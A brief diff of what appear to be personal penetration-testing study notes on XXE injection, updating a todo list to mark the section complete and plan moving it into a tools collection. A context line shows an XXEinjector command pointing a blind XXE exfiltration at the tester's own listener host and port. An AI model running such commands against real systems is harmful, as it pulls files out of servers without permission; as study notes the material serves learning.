@@ -585,4 +585,5 @@ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=
 > Note: The data will probably not be printed to the console, however, we can view the results in the log file in the tools folder.
 
 # todo
-- [ ] Resume at Blind Data Exfiltration 
+- [x] Complete
+- [ ] Break this out into MyHackTools
